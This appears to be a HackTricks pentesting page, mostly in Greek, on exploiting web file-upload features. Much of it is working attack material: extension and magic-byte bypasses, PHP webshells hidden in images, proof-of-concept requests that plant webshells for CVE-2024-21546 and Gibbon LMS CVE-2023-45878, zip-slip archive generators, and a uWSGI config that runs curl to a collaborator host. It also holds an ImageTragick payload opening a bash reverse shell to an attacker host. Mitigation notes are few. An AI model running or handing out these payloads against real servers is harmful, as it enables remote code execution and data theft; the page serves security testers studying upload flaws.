# Ανέβασμα Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## File Upload General Methodology

Άλλες χρήσιμες επεκτάσεις:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων επεκτάσεων αρχείων

1. Εάν εφαρμόζεται, ελέγξτε τις προηγούμενες επεκτάσεις. Δοκιμάστε επίσης με μερικά **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Ελέγξτε **προσθέτοντας μια έγκυρη επέκταση πριν** την εκτελέσιμη επέκταση (χρησιμοποιήστε επίσης τις προηγούμενες επεκτάσεις):_
- _file.png.php_
- _file.png.Php5_
3. Προσπαθήστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε το Burp για **bruteforce** όλων των **ascii** και **Unicode** χαρακτήρων. (_Σημειώστε ότι μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερθείσες **επεκτάσεις**_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τις προστασίες **παραπλανώντας τον parser επεκτάσεων** στην πλευρά του server με τεχνικές όπως **doubling** της **επέκτασης** ή **προσθέτοντας junk** δεδομένα (**null** bytes) μεταξύ των επεκτάσεων. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να προετοιμάσετε καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **άλλο επίπεδο επεκτάσεων** στον προηγούμενο έλεγχο:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Προσπαθήστε να βάλετε την **εκτελέσιμη επέκταση πριν από την έγκυρη επέκταση** και ελπίζετε ότι ο server είναι λανθασμένα διαμορφωμένος. (χρήσιμο για εκμετάλλευση λανθασμένων ρυθμίσεων Apache όπου οτιδήποτε με επέκταση** _**.php**_**, αλλά** όχι απαραίτητα τελειώνει σε .php** θα εκτελείται):
- _ex: file.php.png_
7. Χρήση **NTFS alternate data stream (ADS)** σε **Windows**. Σε αυτή τη περίπτωση, ένας χαρακτήρας άνω-κάτω τελείας ":" θα εισαχθεί μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπόμενη. Ως αποτέλεσμα, ένα **κενό αρχείο με την απαγορευμένη επέκταση** θα δημιουργηθεί στον server (π.χ. "file.asax:.jpg”). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα χρησιμοποιώντας άλλες τεχνικές όπως η χρήση του short filename του. Το μοτίβο "**::$data**” μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη-κενά αρχεία. Επομένως, η προσθήκη ενός τελείας μετά από αυτό το μοτίβο μπορεί επίσης να είναι χρήσιμη για να παρακάμψετε περαιτέρω περιορισμούς (π.χ. "file.asp::$data.”)
8. Προσπαθήστε να σπάσετε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται. Και το κακόβουλο PHP παραμένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Κάποιοι upload handlers αφαιρούν ή κανονικοποιούν τους τελικούς χαρακτήρες τελείας από το αποθηκευμένο όνομα αρχείου. Στο UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) σε εκδόσεις πριν την 2.9.1, μπορείτε να παρακάμψετε τον έλεγχο επεκτάσεων με:

- Χρήση ενός έγκυρου image MIME και magic header (π.χ. το `\x89PNG\r\n\x1a\n` του PNG).
- Ονομάζοντας το ανεβασμένο αρχείο με μια PHP επέκταση ακολουθούμενη από τελεία, π.χ., `shell.php.`.
- Ο server αφαιρεί την τελική τελεία και αποθηκεύει το `shell.php`, το οποίο θα εκτελεστεί αν τοποθετηθεί σε έναν web-served κατάλογο (default public storage όπως `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Στη συνέχεια προσπελάστε την αποθηκευμένη διαδρομή (τυπικό σε Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Εφαρμόστε αυστηρές server-side allowlists και επαληθεύστε ξανά το persisted filename.
- Serve uploads από μη-εκτελέσιμες τοποθεσίες.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Αν γίνεται compression στην εικόνα σας, για παράδειγμα με κάποιες standard PHP βιβλιοθήκες όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές μπορεί να μην δουλέψουν. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η web σελίδα μπορεί επίσης να κάνει **resizing** της **image**, χρησιμοποιώντας για παράδειγμα τις PHP-GD συναρτήσεις `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Άλλη τεχνική για να δημιουργηθεί payload που **survives an image resizing**, χρησιμοποιώντας τη PHP-GD συνάρτηση `thumbnailImage`. Εναλλακτικά, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Βρείτε ευπάθεια που να επιτρέπει το **rename** του αρχείου που έχει ήδη ανέβει (για να αλλάξετε το extension).
- Βρείτε μια **Local File Inclusion** ευπάθεια για να εκτελέσετε το backdoor.
- **Possible Information disclosure**:
1. Upload **several times** (και ταυτόχρονα) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Upload ενός αρχείου με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Upload ενός αρχείου με όνομα **"." , "..", or "…"**. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα uploaded αρχεία στον κατάλογο "/www/uploads/", το filename "." θα δημιουργήσει ένα αρχείο που ονομάζεται
uploads” στον κατάλογο "/www/".
4. Upload ενός αρχείου που δεν μπορεί να διαγραφεί εύκολα όπως **"…:.jpg"** σε **NTFS**. (Windows)
5. Upload ενός αρχείου σε **Windows** με **invalid characters** όπως `|<>*?”` στο όνομά του. (Windows)
6. Upload ενός αρχείου σε **Windows** χρησιμοποιώντας **reserved** (**forbidden**) **names** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Δοκιμάστε επίσης να upload-άρετε ένα εκτελέσιμο (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **will execute code** όταν ανοιχτεί κατά λάθος από το θύμα.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Οπότε, όπως αναφέρεται στην παρακάτω εικόνα, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε το shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Για λεπτομερή διερεύνηση αυτής της ευπάθειας δείτε την αρχική έρευνα: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ευπάθειες μπορούν να εκμεταλλευτούν σε uWSGI servers εάν κάποιος έχει τη δυνατότητα να τροποποιήσει το `.ini` configuration file. Τα uWSGI configuration files χρησιμοποιούν μια συγκεκριμένη σύνταξη για να ενσωματώσουν "magic" variables, placeholders, και operators. Ιδιαίτερα, ο operator '@', που χρησιμοποιείται ως `@(filename)`, προορίζεται για να include τα περιεχόμενα ενός αρχείου. Από τα διάφορα supported schemes στο uWSGI, το "exec" scheme είναι ιδιαίτερα ισχυρό, επιτρέποντας την ανάγνωση δεδομένων από το standard output μιας διεργασίας. Αυτή η λειτουργία μπορεί να χρησιμοποιηθεί με κακόβουλο τρόπο για Remote Command Execution ή Arbitrary File Write/Read όταν ένα `.ini` configuration file υποβληθεί σε επεξεργασία.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά την ανάλυση του configuration file. Για να ενεργοποιηθεί και να αναλυθεί η configuration, η διεργασία uWSGI πρέπει είτε να επανεκκινηθεί (πιθανώς μετά από crash ή εξαιτίας μιας Denial of Service attack) είτε το αρχείο να έχει ρυθμιστεί για auto-reload. Η λειτουργία αυτόματης επαναφόρτωσης, αν είναι ενεργοποιημένη, επαναφορτώνει το αρχείο σε καθορισμένα διαστήματα όταν εντοπίζει αλλαγές.

Είναι κρίσιμο να κατανοήσουμε την χαλαρή φύση του τρόπου με τον οποίο γίνεται το parsing του configuration file του uWSGI. Συγκεκριμένα, το αναφερθέν payload μπορεί να εισαχθεί σε ένα δυαδικό αρχείο (όπως μια εικόνα ή ένα PDF), διευρύνοντας περαιτέρω το εύρος πιθανής εκμετάλλευσης.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Ένα unauthenticated endpoint στο Gibbon LMS επιτρέπει arbitrary file write μέσα στο web root, οδηγώντας σε pre-auth RCE με την τοποθέτηση ενός PHP αρχείου. Ευάλωτες εκδόσεις: έως και η 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (ο server αγνοεί το type/name, κάνει base64-decode του τμήματος που ακολουθεί)
- `path`: destination filename relative to Gibbon install dir (π.χ., `poc.php` ή `0xdf.php`)
- `gibbonPersonID`: οποιαδήποτε μη-κενή τιμή γίνεται αποδεκτή (π.χ., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Τοποθέτησε ένα ελάχιστο webshell και εκτέλεσε εντολές:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- Ο handler εκτελεί `base64_decode($_POST["img"])` μετά το split με `;` και `,`, στη συνέχεια γράφει bytes στο `$absolutePath . '/' . $_POST['path']` χωρίς να ελέγχει extension/type.
- Ο προκύπτων κώδικας εκτελείται ως ο χρήστης της web υπηρεσίας (π.χ., XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

In some occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.**\
The **μέγιστο** μήκος ενός **filename** σε **linux** είναι **255**, ωστόσο, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Απόδραση του καταλόγου upload μέσω NTFS junctions (Windows)

(Για αυτή την επίθεση θα χρειαστείτε τοπική πρόσβαση στη μηχανή Windows) Όταν τα uploads αποθηκεύονται σε υποφακέλους ανά χρήστη στα Windows (π.χ., C:\Windows\Tasks\Uploads\<id>\) και ελέγχετε τη δημιουργία/διαγραφή αυτού του υποφακέλου, μπορείτε να τον αντικαταστήσετε με ένα directory junction που δείχνει σε μια ευαίσθητη τοποθεσία (π.χ., το webroot). Τα επόμενα uploads θα γραφτούν στο target path, επιτρέποντας code execution εάν ο στόχος ερμηνεύει server‑side code.

Παράδειγμα ροής για την ανακατεύθυνση των uploads στο XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Σημειώσεις
- mklink /J creates an NTFS directory junction (reparse point). Ο λογαριασμός του web server πρέπει να ακολουθεί το junction και να έχει δικαίωμα εγγραφής στον προορισμό.
- Αυτό αναδρομολογεί αυθαίρετες εγγραφές αρχείων· αν ο προορισμός εκτελεί scripts (PHP/ASP), αυτό γίνεται RCE.
- Μέτρα άμυνας: μην επιτρέπετε writable upload roots να είναι attacker‑controllable κάτω από C:\Windows\Tasks ή παρόμοια· μπλοκάρετε τη δημιουργία junctions· validate extensions server‑side· αποθηκεύστε uploads σε ξεχωριστό volume ή με deny‑execute ACLs.

## Εργαλεία

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Κάποιοι legacy upload handlers που χρησιμοποιούν `snprintf()` ή παρόμοια για να χτίσουν multi-file arrays από ένα single-file upload μπορούν να εξαπατηθούν ώστε να πλαστογραφήσουν τη δομή `_FILES`. Λόγω ασυνεπειών και αποκοπών στη συμπεριφορά του `snprintf()`, ένα προσεκτικά κατασκευασμένο single upload μπορεί να εμφανιστεί ως πολλαπλά indexed αρχεία στην πλευρά του server, μπερδεύοντας λογική που υποθέτει συγκεκριμένη δομή (π.χ. treating it as a multi-file upload and taking unsafe branches). Παρότι σήμερα είναι niche, αυτό το μοτίβο “index corruption” αναδύεται περιστασιακά σε CTFs και παλαιότερα codebases.

## Από το File upload σε άλλες ευπάθειες

- Ορίστε **filename** σε `../../../tmp/lol.png` και δοκιμάστε να επιτύχετε **path traversal**
- Ορίστε **filename** σε `sleep(10)-- -.jpg` και ίσως καταφέρετε **SQL injection**
- Ορίστε **filename** σε `<svg onload=alert(document.domain)>` για να επιτύχετε **XSS**
- Ορίστε **filename** σε `; sleep 10;` για να δοκιμάσετε κάποιο command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Δοκιμάστε **different svg payloads** από [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Αν μπορείτε να υποδείξετε στον web server να τραβήξει μια **εικόνα** από ένα URL, μπορείτε να δοκιμάσετε να καταχραστείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Αν αυτή η **εικόνα** πρόκειται να **αποθηκευτεί** σε κάποιο **δημόσιο** site, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **κλέψετε πληροφορίες κάθε επισκέπτη**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Αν μπορείτε να ανεβάσετε PDFs, μπορείτε να προετοιμάσετε κάποιο PDF που θα εκτελέσει αυθαίρετο JS ακολουθώντας τις οδηγίες.
- Ανεβάστε το \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content για να ελέγξετε αν ο server έχει κάποιο **antivirus**
- Ελέγξτε αν υπάρχει οποιοδήποτε **size limit** κατά την upload αρχείων

Εδώ είναι μια top 10 λίστα πραγμάτων που μπορείτε να επιτύχετε ανεβάζοντας (από [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Μαγικά Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Ανατρέξτε στο [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) για άλλους τύπους αρχείων.

## Zip/Tar File Automatically decompressed Upload

Αν μπορείτε να ανεβάσετε ένα ZIP που πρόκειται να αποσυμπιεστεί στον server, μπορείτε να κάνετε 2 πράγματα:

### Symlink

Ανεβάστε ένα αρχείο που περιέχει soft links προς άλλα αρχεία· κατά την πρόσβαση στα αποσυμπιεσμένα αρχεία θα έχετε πρόσβαση στα συνδεδεμένα αρχεία:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Η απροσδόκητη δημιουργία αρχείων σε directories κατά τη διάρκεια της decompression αποτελεί σημαντικό ζήτημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να προστατεύει από OS-level command execution μέσω malicious file uploads, το hierarchical compression support και οι δυνατότητες directory traversal του ZIP archive format μπορούν να αξιοποιηθούν. Αυτό επιτρέπει σε επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από secure upload directories χειραγωγώντας τη decompression λειτουργία της στοχευμένης εφαρμογής.

Ένας automated exploit για τη δημιουργία τέτοιων αρχείων είναι διαθέσιμος στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Η utility μπορεί να χρησιμοποιηθεί όπως φαίνεται:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, το **symlink trick with evilarc** είναι μια επιλογή. Εάν ο στόχος είναι να στοχεύσετε ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργηθεί ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό διασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω είναι ένα παράδειγμα κώδικα Python που χρησιμοποιείται για να δημιουργήσει ένα malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση της συμπίεσης για file spraying**

Για περισσότερες λεπτομέρειες **δείτε την αρχική ανάρτηση στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Γράφεται κώδικας PHP για να εκτελεί εντολές που δίνονται μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα zip αρχείο που περιέχει αυτά τα αρχεία.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Τα ονόματα των αρχείων μέσα στο zip αλλάζουν χρησιμοποιώντας vi ή έναν Hex Editor, αντικαθιστώντας το "xxA" με "../" για να διασχίσουν καταλόγους.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με μια image extension για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

